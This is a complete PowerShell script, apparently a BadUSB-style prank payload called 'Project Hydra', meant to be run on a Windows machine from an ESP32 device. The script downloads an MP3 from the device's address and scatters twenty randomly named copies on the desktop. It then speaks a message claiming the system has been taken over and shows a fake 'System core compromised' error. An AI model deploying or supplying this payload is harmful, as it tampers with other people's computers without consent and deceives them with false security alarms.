# Links and dirs - served locally from ESP32 SPIFFS
$audioUrl     = "http://192.168.4.1/payloads/laugh.mp3"
$desktopPath  = [Environment]::GetFolderPath("Desktop")
$tempPath     = "$env:TEMP\Hydra_assets"
if (!(Test-Path $tempPath)) { New-Item -ItemType Directory -Path $tempPath }

# Audio: download from ESP32
$mp3File = "$tempPath\laugh.mp3"
Invoke-WebRequest -Uri $audioUrl -OutFile $mp3File

# Scatter MP3 copies on desktop
for ($i = 1; $i -le 20; $i++) {
    $randomName = -join ((65..90) + (97..122) | Get-Random -Count 12 | % { [char]$_ })
    Copy-Item $mp3File -Destination "$desktopPath\$randomName.mp3"
}

# Text-to-speech
$voice = New-Object -ComObject SAPI.SpVoice
$voice.Speak("Hydra has entered the system. Your desktop belongs to Hydra now.")

# Fake error popup
Add-Type -AssemblyName PresentationFramework
[System.Windows.MessageBox]::Show("CRITICAL ERROR: System core compromised. Initiating laugh.exe", "Project Hydra") | Out-Null

exit
